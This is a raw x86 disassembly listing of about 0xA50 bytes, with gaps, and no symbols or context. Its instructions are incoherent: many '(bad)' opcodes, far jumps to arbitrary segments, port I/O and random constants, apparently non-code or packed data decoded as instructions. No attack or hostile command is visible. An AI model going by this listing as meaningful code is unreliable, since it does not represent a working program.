  4262dd:	jmp    0xd340:0x9179684c
  4262e4:	inc    ebp
  4262e5:	xor    dl,BYTE PTR [eax-0xe85f46c]
  4262eb:	daa    
  4262ec:	push   ds
  4262ed:	or     edi,edx
  4262ef:	dec    edi
  4262f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	sar    DWORD PTR [esi-0x1b],1
  4262f4:	fild   WORD PTR [ecx+esi*2]
  4262f7:	out    0x95,al
  4262f9:	imul   ecx,DWORD PTR [eax+0x52],0x71e9fce4
  426300:	pop    edi
  426301:	out    0x9d,al
  426303:	jb     0x426297
  426305:	and    ecx,DWORD PTR [ebp-0x57]
  426308:	mov    al,0xbb
  42630a:	mov    dh,0x9a
  42630c:	adc    DWORD PTR [edi+0xb8ea],0x0
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x32a09ef5
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    bl,dl
  42638d:	dec    ebp
  42638e:	test   eax,0x28672278
  426393:	or     eax,0xff9ac32e
  426398:	pop    ds
  426399:	push   edx
  42639a:	xchg   esi,eax
  42639b:	sub    DWORD PTR [ebp-0x13b32d16],ecx
  4263a1:	jno    0x4263e0
  4263a3:	js     0x426404
  4263a5:	int3   
  4263a6:	sbb    BYTE PTR [edi],bl
  4263a8:	cmp    bh,BYTE PTR [eax-0x5c]
  4263ab:	cmp    eax,0xc89379b
  4263b0:	cmp    esi,DWORD PTR es:[esi]
  4263b3:	push   eax
  4263b4:	dec    BYTE PTR cs:[edi-0x9]
  4263b8:	call   0x9db8da2d
  4263bd:	xchg   esi,eax
  4263be:	inc    esi
  4263bf:	outs   dx,BYTE PTR ds:[esi]
  4263c0:	sub    al,0x68
  4263c2:	mov    ebx,DWORD PTR [eax+eiz*8]
  4263c5:	push   ecx
  4263c6:	shl    BYTE PTR [esi-0x1dd80497],1
  4263cc:	imul   esi,ecx,0xbdcf0559
  4263d2:	ficom  DWORD PTR [eax+0x185bce3c]
  4263d8:	adc    BYTE PTR [ecx],0x95
  4263db:	push   edi
  4263dc:	xchg   ebx,eax
  4263dd:	jmp    0x426393
  4263df:	xchg   esp,eax
  4263e0:	not    eax
  4263e2:	inc    esi
  4263e3:	sbb    bh,BYTE PTR [ebx+0x515777ba]
  4263e9:	imul   esi,edi,0x57
  4263ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263ed:	sub    al,0xf8
  4263ef:	rol    ebp,1
  4263f1:	inc    ebx
  4263f2:	into   
  4263f3:	dec    edx
  4263f4:	push   edi
  4263f5:	sbb    BYTE PTR [ebx+0x62c8d353],dl
  4263fb:	xlat   BYTE PTR es:[ebx]
  4263fd:	nop
  4263fe:	jns    0x426415
  426400:	scas   al,BYTE PTR es:[edi]
  426401:	cmc    
  426402:	ins    DWORD PTR es:[edi],dx
  426403:	mov    BYTE PTR [ecx+edx*1+0x61],dl
  426407:	xchg   edx,eax
  426408:	arpl   WORD PTR [ebx+0x2c4a8222],sp
  42640e:	jg     0x426471
  426410:	xchg   edi,eax
  426411:	dec    edi
  426412:	adc    eax,0x4bbe586e
  426417:	mov    ecx,0xc874c6b6
  42641c:	xchg   edi,eax
  42641d:	adc    edx,ebx
  42641f:	enter  0x897c,0xab
  426423:	stc    
  426424:	sbb    eax,0x545943c2
  426429:	aas    
  42642a:	sar    ebx,cl
  42642c:	or     al,0x23
  42642e:	repnz test eax,0xbd18b0b
  426434:	push   ebx
  426435:	mov    ecx,0x8254b87c
  42643a:	xor    ebp,DWORD PTR [esi]
  42643c:	mov    ch,0xbc
  42643e:	retf   0x8373
  426441:	xchg   edi,eax
  426442:	inc    edi
  426443:	sub    eax,0x700b80e1
  426448:	out    dx,eax
  426449:	fcomp  QWORD PTR [ebp+0xf]
  42644c:	cwde   
  42644d:	outs   dx,BYTE PTR ds:[esi]
  42644e:	cdq    
  42644f:	push   0x43
  426451:	mov    eax,ds:0xa2dd5b99
  426456:	nop
  426457:	and    eax,0xb4c2ebc6
  42645c:	into   
  42645d:	push   0x8846bbd5
  426462:	xor    BYTE PTR [esi+edx*8+0x64],0xd3
  426467:	mov    BYTE PTR [esi],ch
  426469:	mov    edi,0x25c47086
  42646e:	loope  0x4264c8
  426470:	es xchg ebx,eax
  426472:	gs (bad) 
  426474:	js     0x4264eb
  426476:	(bad)  
  426478:	mov    al,ds:0x99fe49d9
  42647d:	xlat   BYTE PTR ds:[ebx]
  42647e:	push   edx
  42647f:	or     bl,dh
  426481:	ins    BYTE PTR es:[edi],dx
  426482:	dec    edi
  426483:	pop    ss
  426484:	push   0xffffffa4
  426486:	mov    BYTE PTR [edi+eiz*4],cl
  426489:	mov    cl,BYTE PTR [ebx+ebp*8+0x55]
  42648d:	xchg   BYTE PTR [ebp-0x4f],bh
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0x27e1ea85]
  426503:	in     al,0xec
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	mul    DWORD PTR [edx-0x5fc0e5cb]
  426512:	or     bh,ah
  426514:	test   DWORD PTR [ebx],ebp
  426516:	or     BYTE PTR [edx+0x1a],bl
  426519:	js     0x4264d6
  42651b:	mov    edi,0xe612aab4
  426520:	fcomp  QWORD PTR [edx+0x228b3cc0]
  426526:	cld    
  426527:	mov    ebp,0x59b34a32
  42652c:	adc    DWORD PTR [edx+ebp*4+0x5],esi
  426530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426531:	xchg   ebx,eax
  426532:	in     al,0xa4
  426534:	fild   WORD PTR ds:0x61972d84
  42653a:	inc    ecx
  42653b:	push   ss
  42653c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42653d:	push   esp
  42653e:	mov    ah,0xb
  426540:	inc    esi
  426541:	cmc    
  426542:	push   ds
  426543:	mov    fs,WORD PTR [ebx-0x5172542d]
  426549:	js     0x426564
  42654b:	inc    ebx
  42654c:	add    esp,DWORD PTR [ebx]
  42654e:	and    al,BYTE PTR [edi]
  426550:	and    ebp,0xedcc1baa
  426556:	pop    ss
  426557:	inc    ecx
  426558:	(bad)  
  426559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42655a:	cmp    ecx,edi
  42655c:	scas   al,BYTE PTR es:[edi]
  42655d:	or     DWORD PTR [edx+edi*4+0x33],ebx
  426561:	lods   eax,DWORD PTR ds:[esi]
  426562:	aas    
  426563:	in     al,0xd1
  426565:	(bad)  
  426566:	shl    DWORD PTR [esi],0x7a
  426569:	push   cs
  42656a:	out    dx,eax
  42656b:	jnp    0x426594
  42656d:	clc    
  42656e:	mov    ebp,DWORD PTR [ecx+0x73291b25]
  426574:	cdq    
  426575:	sub    ch,BYTE PTR [ecx]
  426577:	inc    edx
  426578:	mov    ebp,0x5097ef81
  42657d:	xchg   edx,eax
  42657e:	jne    0x4265e0
  426580:	and    edx,0xffffffd9
  426583:	adc    eax,0x50455cb
  426588:	js     0x4265e3
  42658a:	inc    ebx
  42658b:	adc    al,0x2
  42658d:	aad    0x57
  42658f:	inc    ebp
  426590:	inc    esi
  426591:	add    al,0x68
  426593:	fdivp  st(3),st
  426595:	test   BYTE PTR [edi+0x72242089],0xce
  42659c:	sbb    eax,0xd706fc61
  4265a1:	fld    TBYTE PTR [ebx+0x2a]
  4265a4:	pop    edx
  4265a5:	aam    0x3c
  4265a7:	xchg   edx,eax
  4265a8:	stos   DWORD PTR es:[edi],eax
  4265a9:	and    ebp,DWORD PTR [ebx+0x3d]
  4265ac:	mov    bh,0x85
  4265ae:	stos   BYTE PTR es:[edi],al
  4265af:	inc    ecx
  4265b0:	rol    BYTE PTR cs:[edx+0x51],1
  4265b4:	rol    DWORD PTR [eax+esi*4-0x37],1
  4265b8:	sub    eax,0xc08c5cb9
  4265bd:	xchg   ebx,eax
  4265be:	pop    ss
  4265bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265c0:	mov    WORD PTR [ecx-0x20ffe77d],fs
  4265c6:	ret    
  4265c7:	mov    ebx,0x5096a687
  4265cc:	mov    eax,0x6cce957e
  4265d1:	arpl   WORD PTR [ebx-0x29],bx
  4265d4:	cdq    
  4265d5:	or     eax,0x362e353
  4265da:	and    BYTE PTR [ebx-0x3cab9d88],ah
  4265e0:	push   cs
  4265e1:	pop    ebp
  4265e2:	arpl   sp,dx
  4265e4:	adc    ebp,DWORD PTR [ebp-0x2a]
  4265e7:	jg     0x42659f
  4265e9:	dec    ecx
  4265ea:	inc    edi
  4265eb:	mov    gs,WORD PTR [esi]
  4265ed:	mov    esi,0x160d323a
  4265f2:	aad    0x1b
  4265f4:	ja     0x42663d
  4265f6:	mov    ds:0x361bde65,eax
  4265fb:	popf   
  4265fc:	adc    BYTE PTR ds:0x4095163b,ch
  426602:	mov    esi,0x32efa930
  426607:	adc    DWORD PTR [edx-0x28afde53],ebx
  42660d:	pop    ebp
  42660e:	call   DWORD PTR [ebp+0x0]
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x7ac0925c]
  426682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426683:	lahf   
  426684:	lock cdq 
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	xor    al,0x16
  42668e:	jl     0x426640
  426690:	mov    es,WORD PTR ds:0xd25c64c0
  426696:	mov    ds:0x562bc814,eax
  42669b:	stc    
  42669c:	pop    ss
  42669d:	or     eax,0x3f0124dc
  4266a2:	pop    eax
  4266a3:	leave  
  4266a4:	test   dl,dl
  4266a6:	leave  
  4266a7:	and    ecx,DWORD PTR [ecx+0x3c]
  4266aa:	adc    cl,BYTE PTR [esi]
  4266ac:	sbb    edx,DWORD PTR ds:[ecx]
  4266af:	(bad)  
  4266b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b1:	mov    edx,0x5031812f
  4266b6:	(bad)  
  4266b7:	mul    DWORD PTR [ebx+0x53a71e13]
  4266bd:	cwde   
  4266be:	push   ebp
  4266bf:	or     esi,DWORD PTR [eax-0x7841aecd]
  4266c5:	nop
  4266c6:	popa   
  4266c7:	mov    al,0x43
  4266c9:	shl    BYTE PTR [edx-0x1a0baed7],cl
  4266cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266d0:	mov    es,edx
  4266d2:	fnstenv [ecx+0x2a07a8b4]
  4266d8:	mov    cl,ch
  4266da:	push   ebx
  4266db:	pop    ebp
  4266dc:	mov    ch,0x23
  4266de:	call   0xb89b:0x55dca294
  4266e5:	ret    0x7ee9
  4266e8:	inc    eax
  4266e9:	jb     0x42668f
  4266eb:	xor    bl,BYTE PTR [edi-0x2d]
  4266ee:	jmp    0xec768515
  4266f3:	lods   eax,DWORD PTR ds:[esi]
  4266f4:	aam    0x76
  4266f6:	adc    eax,0xb2dbf64c
  4266fb:	mul    DWORD PTR [ebx+0x64a4d5ce]
  426701:	dec    esp
  426702:	sahf   
  426703:	xchg   esi,eax
  426704:	fiadd  WORD PTR [edx+0x75]
  426707:	sbb    ecx,DWORD PTR [ecx]
  426709:	jno    0x4266f5
  42670b:	das    
  42670c:	adc    eax,0x92658c4a
  426711:	pop    edx
  426712:	lahf   
  426713:	fwait
  426714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426715:	mov    eax,ds:0xfa469f58
  42671a:	(bad)  
  42671b:	jno    0x42675c
  42671d:	pop    esp
  42671e:	les    edx,FWORD PTR [edx+ebp*4]
  426721:	or     DWORD PTR [edx+ecx*4-0x7320eaf9],eax
  426728:	sbb    al,0x9
  42672a:	xor    esi,DWORD PTR [edx]
  42672c:	mov    eax,ds:0x7c3b6602
  426731:	mov    ds:0x28e2b184,al
  426736:	das    
  426737:	das    
  426738:	cmp    DWORD PTR [edi-0x1b7503bc],0xffffffba
  42673f:	or     ebx,edi
  426741:	jae    0x426745
  426743:	inc    edx
  426744:	push   esp
  426745:	shr    BYTE PTR [edi+0x5d],cl
  426748:	jmp    0x6106d8df
  42674d:	push   ebp
  42674e:	add    DWORD PTR [esi-0x33],esi
  426751:	jae    0x4267b2
  426753:	addr16 sbb bh,bl
  426756:	sub    edx,ebp
  426758:	stos   DWORD PTR es:[edi],eax
  426759:	mov    eax,ds:0x78b51687
  42675e:	ins    DWORD PTR es:[edi],dx
  42675f:	jl     0x4267bc
  426761:	sar    ebp,1
  426763:	mov    ah,0xd4
  426765:	mov    ds:0x580e0d04,al
  42676a:	es cs inc edx
  42676d:	shl    BYTE PTR [edx+0x55],cl
  426770:	outs   dx,BYTE PTR ds:[esi]
  426771:	and    esp,DWORD PTR [eax]
  426773:	pusha  
  426774:	dec    esi
  426775:	or     BYTE PTR [ebp+edx*8-0x5d],0x4f
  42677a:	cmp    bl,bh
  42677c:	xchg   esi,eax
  42677d:	mov    dh,0x51
  42677f:	mov    eax,ds:0x599bac78
  426784:	adc    dh,BYTE PTR [ebx+edi*4]
  426787:	fsincos 
  426789:	sub    BYTE PTR [ebx],ch
  42678b:	inc    eax
  42678c:	stos   BYTE PTR es:[edi],al
  42678d:	aaa    
  42678e:	call   0x4267a2
	...
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	fld    QWORD PTR [esi+0x19]
  426803:	outs   dx,DWORD PTR ds:[esi]
  426804:	hlt    
  426805:	call   0x0:0x1040001
  42680c:	aad    0xe3
  42680e:	call   0x9408f155
  426813:	(bad)  
  426814:	jecxz  0x4267f6
  426816:	xchg   bl,dh
  426818:	sub    cx,0x2ef
  42681d:	jmp    0xcb5a:0xa0d2daf2
  426824:	mov    ss,WORD PTR ss:[ebx+eiz*4+0x5a34178a]
  42682c:	cmp    ecx,DWORD PTR [edi+ebx*1]
  42682f:	xor    BYTE PTR ds:0x4d09bfad,ah
  426835:	xchg   ebx,eax
  426836:	ja     0x426899
  426838:	shl    DWORD PTR [edi],cl
  42683a:	retf   0x7783
  42683d:	data16 fdiv st(7),st
  426840:	sub    DWORD PTR [esi],edx
  426842:	inc    ebp
  426843:	mov    ch,0xe7
  426845:	mov    ebx,0x352860fa
  42684a:	add    BYTE PTR [ebx+0x686bae41],al
  426850:	fcom   QWORD PTR ds:0xc42f81d9
  426856:	aam    0xcc
  426858:	ds daa 
  42685a:	add    eax,0x7ea731c2
  42685f:	add    DWORD PTR [edi+0x6c87db6e],eax
  426865:	dec    esi
  426866:	add    BYTE PTR [ecx-0x3c620563],cl
  42686c:	mov    eax,ds:0xa036601c
  426871:	icebp  
  426872:	jae    0x42687d
  426874:	jp     0x426837
  426876:	clc    
  426877:	sbb    ebx,DWORD PTR [ebx+0x2]
  42687a:	lahf   
  42687b:	mov    al,0x25
  42687d:	imul   eax,DWORD PTR [eax],0x4ab71236
  426883:	arpl   WORD PTR [edi],ax
  426885:	add    eax,DWORD PTR [ebp-0x774c2316]
  42688b:	(bad)  
  42688c:	mov    al,ds:0x9fb4451d
  426891:	stos   DWORD PTR es:[edi],eax
  426892:	add    al,0x97
  426894:	push   es
  426895:	fbld   TBYTE PTR [ebp-0x1c691a83]
  42689b:	int3   
  42689c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42689d:	push   ds
  42689e:	bound  ecx,QWORD PTR [ebp+0x22]
  4268a1:	add    DWORD PTR [ebx-0x1],edx
  4268a4:	aas    
  4268a5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268a7:	pop    ebx
  4268a8:	xchg   ebp,eax
  4268a9:	lahf   
  4268aa:	push   cs
  4268ab:	xchg   ecx,eax
  4268ac:	rol    BYTE PTR [esi],0x14
  4268af:	les    esi,FWORD PTR [esi]
  4268b1:	inc    ebp
  4268b2:	fwait
  4268b3:	icebp  
  4268b4:	pop    ecx
  4268b5:	ret    
  4268b6:	or     dh,BYTE PTR [eax+0x5e]
  4268b9:	call   0x693d4da0
  4268be:	mov    ss:0xc144cf77,al
  4268c4:	lock retf 0xcb81
  4268c8:	fdivr  QWORD PTR [ebx]
  4268ca:	push   cs
  4268cb:	stc    
  4268cc:	mov    ebp,0xfdb02375
  4268d1:	pop    es
  4268d2:	loopne 0x426934
  4268d4:	fnstsw WORD PTR [edi+edi*1-0xe1a1ffc]
  4268db:	(bad)
  4268df:	shl    DWORD PTR [edx-0x2d],cl
  4268e2:	inc    ebx
  4268e3:	mov    eax,0xa93fd8e9
  4268e8:	push   edi
  4268e9:	lods   eax,DWORD PTR ds:[esi]
  4268ea:	adc    al,BYTE PTR [eax]
  4268ec:	mov    ebx,0xa97c154b
  4268f1:	rcr    DWORD PTR [ebp+0x1c],0xd
  4268f5:	dec    ebx
  4268f6:	or     DWORD PTR ds:0x1bf7da96,esi
  4268fc:	xchg   esi,eax
  4268fd:	push   eax
  4268fe:	xor    eax,0xc
  426901:	cli    
  426902:	push   esi
  426903:	fmul   QWORD PTR [ebp+eax*8+0x3]
  426907:	jge    0x42693e
  426909:	add    eax,0xe6e1d14c
  42690e:	je     0x4268ad
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    eax,ecx
  426981:	cdq    
  426982:	mov    es,WORD PTR [ecx+0x19bf8]
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	js     0x426943
  42698e:	call   0xa1f6:0xf70b3551
  426995:	icebp  
  426996:	in     eax,dx
  426997:	pop    ecx
  426998:	retf   
  426999:	in     eax,0xf9
  42699b:	cmp    eax,0x1b2e04fc
  4269a0:	aaa    
  4269a1:	scas   eax,DWORD PTR es:[edi]
  4269a2:	cdq    
  4269a3:	xchg   ebp,eax
  4269a4:	xchg   edx,eax
  4269a5:	dec    esi
  4269a6:	dec    ebp
  4269a7:	fidiv  DWORD PTR [ebx+esi*1-0x3a]
  4269ab:	adc    al,0x47
  4269ad:	adc    dh,bl
  4269af:	jecxz  0x42699e
  4269b1:	dec    esp
  4269b2:	je     0x42695c
  4269b4:	inc    edi
  4269b5:	add    esp,DWORD PTR [ebx-0xc]
  4269b8:	fs into 
  4269ba:	sub    bh,dh
  4269bc:	fnsave [eax+0x61]
  4269bf:	pop    ebx
  4269c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269c1:	sub    ch,BYTE PTR ds:0x8002d6ec
  4269c7:	push   ss
  4269c8:	outs   dx,BYTE PTR ds:[esi]
  4269c9:	mov    bl,0x6a
  4269cb:	jp     0x4269c7
  4269cd:	xchg   BYTE PTR [edx+0x56],ah
  4269d0:	call   0x23b7:0x29221abb
  4269d7:	scas   eax,DWORD PTR es:[edi]
  4269d8:	dec    ebx
  4269d9:	ret    0xc4c1
  4269dc:	das    
  4269dd:	jbe    0x426a41
  4269df:	and    edi,esp
  4269e1:	pop    eax
  4269e2:	and    DWORD PTR [edx+edx*8],ebp
  4269e5:	xor    bl,BYTE PTR [ebx]
  4269e7:	sub    al,0xe5
  4269e9:	push   cs
  4269ea:	cmc    
  4269eb:	and    DWORD PTR [ebx+0x48a21186],ebp
  4269f1:	in     eax,0xc3
  4269f3:	cdq    
  4269f4:	add    al,0x93
  4269f6:	mov    ecx,DWORD PTR [edi-0x3896811a]
  4269fc:	and    ebp,DWORD PTR ds:0x3001e2d8
  426a02:	sbb    esi,DWORD PTR [esi+ebp*8-0x79]
  426a06:	fadd   st,st(0)
  426a08:	inc    edx
  426a09:	shl    DWORD PTR [edi+0x56],0xed
  426a0d:	(bad)  
  426a0e:	push   edx
  426a0f:	mov    BYTE PTR [esp+ecx*4-0x60],cl
  426a13:	xchg   edi,eax
  426a14:	inc    eax
  426a15:	cmp    DWORD PTR [edi-0x22415bda],edx
  426a1b:	lods   al,BYTE PTR ds:[esi]
  426a1c:	xchg   edi,eax
  426a1d:	push   ss
  426a1e:	icebp  
  426a1f:	ins    BYTE PTR es:[edi],dx
  426a20:	mov    bh,0xb7
  426a22:	loopne 0x426a7e
  426a24:	jge    0x426a6e
  426a26:	push   0xffffff85
  426a28:	int3   
  426a29:	sub    edx,DWORD PTR [ebx-0x66]
  426a2c:	sti    
  426a2d:	aaa    
  426a2e:	loope  0x426a3b
  426a30:	pop    ebx
  426a31:	into   
  426a32:	and    DWORD PTR [ebx+0x42],0xa0c7ca16
  426a39:	idiv   DWORD PTR [edx]
  426a3b:	mov    eax,ds:0x1425d849
  426a40:	or     DWORD PTR [edx],esi
  426a42:	or     esi,DWORD PTR [bp+di]
  426a45:	jb     0x426ac3
  426a47:	js     0x4269e7
  426a49:	ja     0x426a3d
  426a4b:	cmp    edx,edx
  426a4d:	daa    
  426a4e:	(bad)  
  426a50:	pop    eax
  426a51:	sbb    ch,0xe0
  426a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a55:	push   edi
  426a56:	xchg   DWORD PTR ds:0x6c6d2f88,eax
  426a5c:	xchg   ebx,edx
  426a5e:	jno    0x426ab1
  426a60:	bound  ebp,QWORD PTR [esi]
  426a62:	xor    eax,0xa460271a
  426a67:	aam    0x50
  426a69:	inc    esi
  426a6a:	int    0xb1
  426a6c:	mov    WORD PTR [ecx-0x4e],cs
  426a6f:	cmp    al,0x96
  426a71:	mov    ebx,0x19b24ba4
  426a76:	ss sbb eax,0x13e9beaf
  426a7c:	data16 or al,0xf9
  426a7f:	ins    DWORD PTR es:[edi],dx
  426a80:	cdq    
  426a81:	test   eax,0x37835a2
  426a87:	sub    dh,BYTE PTR [esi-0x44]
  426a8a:	xor    ch,bl
  426a8c:	xor    al,0x21
  426a8e:	std    
  426a8f:	adc    al,0x0
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xed
  426b01:	imul   ecx,edx,0xffffffb6
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	jbe    0x426adb
  426b0e:	fnstenv [ebx-0x17]
  426b11:	sub    BYTE PTR [eax],bl
  426b13:	rol    BYTE PTR [ecx-0x4a1fa773],1
  426b19:	into   
  426b1a:	pop    ss
  426b1b:	paddq  mm2,QWORD PTR [edx-0x2c]
  426b1f:	adc    DWORD PTR [ebp-0x69],edx
  426b22:	fisubr DWORD PTR [ecx+eiz*2-0x56359a9]
  426b29:	stos   BYTE PTR es:[edi],al
  426b2a:	cmp    dh,BYTE PTR [edx+0x6d1cc6c1]
  426b30:	push   ebp
  426b31:	sti    
  426b32:	adc    dh,BYTE PTR [esi+0x485ab9c5]
  426b38:	mov    bl,0xfa
  426b3a:	mov    edi,0xa484feed
  426b3f:	iret   
  426b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b41:	sahf   
  426b42:	in     al,0x32
  426b44:	jno    0x426bc0
  426b46:	jno    0x426ade
  426b48:	imul   edx,DWORD PTR [esi+0x12],0x60
  426b4c:	dec    eax
  426b4d:	adc    BYTE PTR [ebp+edx*2-0xdcb2b6],ch
  426b54:	fmul   DWORD PTR [ebx-0x63]
  426b57:	or     bl,BYTE PTR ds:0x893655fa
  426b5d:	popa   
  426b5e:	addr16 xchg ebp,eax
  426b60:	inc    DWORD PTR [ebx+0x3c3c6418]
  426b66:	fst    DWORD PTR [ecx-0x1f]
  426b69:	sub    esp,ecx
  426b6b:	add    ebp,DWORD PTR [ebx+0x71]
  426b6e:	jmp    0xddb9f51d
  426b73:	pop    edi
  426b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b75:	stos   DWORD PTR es:[edi],eax
  426b76:	(bad)  
  426b77:	std    
  426b78:	iret   
  426b79:	jp     0x426bb7
  426b7b:	dec    ebx
  426b7c:	or     al,0x7d
  426b7e:	fwait
  426b7f:	(bad)  
  426b80:	ficom  WORD PTR [edi-0x40]
  426b83:	xchg   esi,eax
  426b84:	(bad)  
  426b85:	popa   
  426b86:	loopne 0x426bd2
  426b88:	imul   edx,DWORD PTR [edx],0x137bebfa
  426b8e:	mov    esp,0xc2467f9b
  426b93:	push   esp
  426b94:	jle    0x426bd8
  426b96:	xlat   BYTE PTR ds:[ebx]
  426b97:	iret   
  426b98:	mov    dl,0xcd
  426b9a:	push   edi
  426b9b:	adc    esi,DWORD PTR [eax]
  426b9d:	xchg   ebx,eax
  426b9e:	fsub   DWORD PTR [esi+0x76]
  426ba1:	das    
  426ba2:	les    edx,FWORD PTR [esp+eax*1]
  426ba5:	ror    al,0xa7
  426ba8:	and    DWORD PTR [edx],ebx
  426baa:	mov    esi,es
  426bac:	sbb    al,BYTE PTR [ecx+0x5c]
  426baf:	jno    0x426be5
  426bb1:	dec    esp
  426bb2:	sbb    DWORD PTR [eax-0x1305c3f0],ebx
  426bb8:	daa    
  426bb9:	js     0x426c30
  426bbb:	ficomp DWORD PTR [esi-0x8]
  426bbe:	push   ebx
  426bbf:	xchg   DWORD PTR [edi+0x8],ecx
  426bc2:	and    al,0x10
  426bc4:	gs jecxz 0x426bad
  426bc7:	pop    es
  426bc8:	scas   eax,DWORD PTR es:[edi]
  426bc9:	pop    ebp
  426bca:	jg     0x426b92
  426bcc:	jae    0x426c18
  426bce:	out    dx,al
  426bcf:	or     al,0x88
  426bd1:	push   eax
  426bd2:	mov    esp,0x411b4fbf
  426bd7:	jl     0x426b7d
  426bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bda:	xchg   DWORD PTR [edi],eax
  426bdc:	cmp    al,0x56
  426bde:	(bad)  
  426bdf:	xchg   ebp,eax
  426be0:	in     al,dx
  426be1:	mov    ah,0x68
  426be3:	mov    dh,0xae
  426be5:	scas   eax,DWORD PTR es:[edi]
  426be6:	mov    esi,0x5b256f85
  426beb:	xor    BYTE PTR [eax+0x6c],0x4f
  426bef:	mov    ch,0x2b
  426bf1:	fwait
  426bf2:	out    dx,eax
  426bf3:	cmp    dl,BYTE PTR [ecx+eiz*2-0x15]
  426bf7:	jno    0x426c22
  426bf9:	cmc    
  426bfa:	fcmovu st,st(2)
  426bfc:	and    esi,DWORD PTR [edi]
  426bfe:	mov    ah,0xb2
  426c00:	mov    DWORD PTR [ecx+0x4f5e34c3],esp
  426c06:	mov    esp,0x5fb86646
  426c0b:	mov    esi,0x7d4c8d09
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x716c12b1
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	pop    ebp
  426c8d:	leave  
  426c8e:	lock and al,0x26
  426c91:	call   0x6944:0x653dc537
  426c98:	sbb    ecx,DWORD PTR [eax+edx*8+0x235cab67]
  426c9f:	or     eax,0x8b5b2c1d
  426ca4:	dec    esp
  426ca5:	and    al,0xc1
  426ca7:	enter  0x3929,0x3b
  426cab:	jg     0x426c7b
  426cad:	add    al,0xaf
  426caf:	jnp    0x426cdf
  426cb1:	sub    DWORD PTR [esi+0x2b],eax
  426cb4:	je     0x426d05
  426cb6:	aam    0x5f
  426cb8:	out    dx,eax
  426cb9:	lahf   
  426cba:	stc    
  426cbb:	push   es
  426cbc:	sub    ecx,edx
  426cbe:	push   esi
  426cbf:	adc    al,0xf2
  426cc1:	jne    0x426c4b
  426cc3:	icebp  
  426cc4:	inc    esp
  426cc5:	xchg   ebx,eax
  426cc6:	or     bh,BYTE PTR [eax+edx*4+0x5744a434]
  426ccd:	mov    dh,0xd8
  426ccf:	sub    dh,0x35
  426cd2:	add    DWORD PTR [ecx-0x55abb4aa],ebp
  426cd8:	xlat   BYTE PTR cs:[ebx]
  426cda:	jge    0x426cee
  426cdc:	std    
  426cdd:	inc    eax
  426cde:	out    dx,eax
  426cdf:	int    0x11
  426ce1:	mov    WORD PTR [eax+0x27],es
  426ce4:	sbb    ebp,DWORD PTR [ebp+ebx*8+0x219b1d83]
  426ceb:	in     eax,0xd4
  426ced:	adc    dh,BYTE PTR [edx-0x22]
  426cf0:	and    BYTE PTR [esi-0x58],bh
  426cf3:	sub    al,ah
  426cf5:	out    dx,eax
  426cf6:	aad    0x4d
  426cf8:	push   cs
  426cf9:	(bad)  
  426cfa:	lock sub ebp,DWORD PTR [eax]
  426cfd:	mov    ds:0xee5f1704,eax
  426d02:	cmp    BYTE PTR [edx+0x51],al
  426d05:	scas   eax,DWORD PTR es:[edi]
  426d06:	mov    edi,0x19b6e727
  426d0b:	or     eax,0xbd4c6fc6
  426d10:	into   
  426d11:	sbb    BYTE PTR [esi+0x21eb7378],ch
  426d17:	mov    ds:0xe2897b36,al
  426d1c:	icebp  
  426d1d:	jl     0x426cae
  426d1f:	mov    dh,0x99
  426d21:	cmc    
  426d22:	(bad)
  426d26:	pop    ds
  426d27:	pop    ebp
